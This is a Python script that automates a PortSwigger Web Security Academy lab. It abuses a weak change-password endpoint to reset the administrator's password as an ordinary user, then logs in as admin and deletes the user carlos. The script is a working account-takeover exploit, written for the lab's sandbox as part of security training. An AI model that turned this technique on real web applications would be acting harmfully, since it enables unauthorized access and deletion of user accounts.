import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Weak isolation on dual-use endpoint')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# RESET ADMINISTRATOR'S PASSWORD
r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers)
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
r = requests.post("https://" + lab.id + ".web-security-academy.net/my-account/change-password", headers=headers, data={"csrf":csrf,"username":"administrator","new-password-1":"logicvuln","new-password-2":"logicvuln"})

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS ADMINISTRATOR
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"administrator","password":"logicvuln"}, allow_redirects=False)
administrator = r.cookies.get('session')
headers = {"Cookie":f"session={administrator}"}

# DELETE CARLOS' ACCOUNT
requests.get("https://" + lab.id + ".web-security-academy.net/admin/delete?username=carlos", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")